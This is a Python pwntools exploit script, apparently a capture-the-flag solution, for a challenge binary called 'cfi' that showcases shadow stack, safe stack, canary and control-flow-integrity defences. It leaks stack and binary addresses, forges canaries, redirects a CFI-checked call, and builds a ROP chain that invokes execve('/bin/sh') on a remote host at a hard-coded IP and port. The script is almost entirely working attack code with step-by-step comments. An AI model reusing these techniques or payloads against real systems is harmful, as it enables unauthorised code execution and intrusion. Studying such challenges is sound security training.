#!/usr/bin/python3.11

from pwn import *

exe = ELF("./cfi", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
# context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = False

# brva 0x0000000000002D3E settings up the call to gets in vuln
# brva 0x00000000000035EA the ROL8 if check in main
# brva 0x00000000000035C1 that weird read with size of 0 bytes call in main()
# brva 0x0000000000003545 menu option input (read call)
# brva 0x000000000000358C right after choosing 5 in the menu
# brva 0x0000000000003605 after returning form vuln() about to check boo and foo
# brva 0x0000000000003619 when calling rax after vuln()

gs = '''
# directory /opt/GLIBC_SOURCE_CODE
# break main
# break shadow_stack_preview
# break safe_stack_preview
# break stack_canary_preview
# break cfi_preview
# break vuln
# break meme
# brva 0x0000000000002D3E
# brva 0x000000000000358C
# brva 0x0000000000003605
brva 0x0000000000003619
# disable
continue
# break __strtol
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result.decode())

def see_shadow_stack(debugPause = False):
	if debugPause:
		input("Calling See shadow stack")
	io.sendlineafter(b"> ", b"1")
	result = io.recvuntil(b"|  <")
	print_result(result)
	return result

def see_safe_stack(debugPause = False):
	if debugPause:
		input("Calling See safe stack")
	io.sendlineafter(b"> ", b"2")
	result = io.recvuntil(b"|  <")
	print_result(result)
	return result

def see_stack_canary(debugPause = False):
	if debugPause:
		input("Calling See stack canary")
	io.sendlineafter(b"> ", b"3")
	result = io.recvuntil(b"|  <")
	print_result(result)
	return result

def see_CFI(debugPause = False):
	if debugPause:
		input("Calling See CFI")
	io.sendlineafter(b"> ", b"4")
	result = io.recvuntil(b"|  <")
	print_result(result)
	return result

def test_cfi_impl(payloada, payloadb, debugPause=False):
	if debugPause:
		input("Requesting Testour CFI implementation")
	io.sendlineafter(b"> ", b"5")
	io.sendlineafter(b"> ", payloada)
	result = io.recvuntil(b"> ")
	print_result(result)
	io.send(payloadb)

def leak_stack_and_binary():
	output = see_shadow_stack(debugPause=False)
	decoded_output = output.decode()
	addresses = re.findall(r'0x[0-9a-fA-F]+', decoded_output)
	stack_address = int(addresses[0], 16)
	binary_address = int(addresses[1], 16)
	binary_offset = 0x33e3
	exe.address = binary_address - binary_offset
	print(f"{hex(stack_address)=}")
	print(f"{hex(exe.address)=}")
	shstk = exe.address+0x80c0
	shstk_stack_ptr = exe.address+0x84c0
	print(f"{hex(shstk)=}")
	print(f"{hex(shstk_stack_ptr)=}")	
	return (shstk, shstk_stack_ptr, stack_address)

		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.59.180:49698"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 0.5

print_result(io.recv())
shstk, shstk_stack_ptr, stack_address = leak_stack_and_binary()

pop_rcx = 0x00000000000029b4 # pop rcx; ret;
rcx_to_rax = 0x00000000000029db # mov rax, rcx; pop rcx; ret;
pop_rdi = 0x0000000000002746 # pop rdi; ret;
pop_rsi = 0x0000000000002b1a # pop rsi; ret;
mov_rdx = 0x0000000000002c50 # mov rdx, qword ptr [rsp + 0x10]; syscall;

address_to_call = exe.address + 0x0000000000003542 # the address to start the ROP from (read)

# This payload is in charge of a few things:
# 1. Fixing the canary to a specific value we control
# 2. Set the address we want to call after the vuln() function instead of foo()
canary = exe.sym['main'] + 0x1d5
vuln_payload = p64(0) * 5    					# Initial padding 																0x7ffff7ca2f90
vuln_payload += p64(canary)  					# Canary 1 																		0x7ffff7ca2fb8
vuln_payload += p64(0) * 6    					# padding
vuln_payload += p64(address_to_call)      		# foo (place address we want to reach here)										0x7ffff7ca2ff0
vuln_payload += p64(canary)  					# Canary 2 																		0x7ffff7ca2ff8
vuln_payload += p64(0) * 210 					# more padding 
vuln_payload += p64(exe.address + 0x7d00)		# fix strtol (Not needed at all at the end. We do not call vuln again)			0x7ffff7ca3698
vuln_payload += p64(0) * 17						# padddddding some more...!
vuln_payload += p64(stack_address+0x58)			# stack address that will overwrite vuln()'s already saved canary + ret address 0x7ffff7ca3720
vuln_payload += p64(0) * 8						# more padding
vuln_payload += p64(canary)  					# Original TLS canary ! 														0x7ffff7ca3768

# This payload is in change of:
# 1. Fixing the canary
# 2. Overwrite RBX which will be used as RSI in the target "address_to_call" which is a read function
meme_payload = p64(canary)						# canary
meme_payload += p64(exe.sym['vuln']+129)		# was vuln+128
meme_payload += p64(stack_address + 0x48)		#                        <<--- use this address to write a ROP chain. This will be RSI
meme_payload += p64(0)							# was 0x7ffff7ccfd90 (__libc_start_call_main+128)
meme_payload += p64(address_to_call)			# r15 was boo - r15 is the static base pointer CFI is checking. We change it to what we set as foo

# Send the payloads !
test_cfi_impl(vuln_payload, meme_payload) 

# The payloads lead to the fact read() function is called.
# read() only reads 0x28 bytes, so we go from there straight to a gets() call. In there we will drop a new payload that ends in a syscall to execve.
read_payload = p64(exe.address + pop_rdi)		# In RSI we have the address of the return address from the read function itself. We overwrite it with a gadget
read_payload += p64(stack_address + 0x70)		# We are about to call gets(). So RDI contains a buffer we want to write into + will overwrite return address 		
read_payload += p64(exe.plt.gets)				# we return to gets

# This is the payload to gets()
# We are forging a call to execve("/bin/sh", 0, 0)...
read_payload += p64(exe.address + pop_rcx)		# we pop 0x3b into rcx
read_payload += p64(0x3b)
read_payload += p64(exe.address + rcx_to_rax)	# we move rcx to rax to setup a call to exceve syscall
read_payload += p64(0x0)						# we pop garbge to complete the rcx_to_rax gadget
read_payload += p64(exe.address + pop_rsi)		# we return to pop_rsi
read_payload += p64(0x0)						# set it to 0 for the execve call
read_payload += p64(exe.address + pop_rdi)		# return to pop_rdi
read_payload += p64(stack_address + 0xa8)		# we point rdi to a stack address that will point to "/bin/sh\x00" string
read_payload += p64(exe.address + mov_rdx)		# we return to setup rdx with 0 for execve call and then the syscall
read_payload += b"/bin/sh\x00"					# we place /bin/sh here at the stack for rdi to pick
read_payload += p64(0) * 2						# we set 0 here for rdx to pick. rdx picks [rsp+0x10]. 

# Send the payload and we get a shell
io.send(read_payload)

io.interactive()
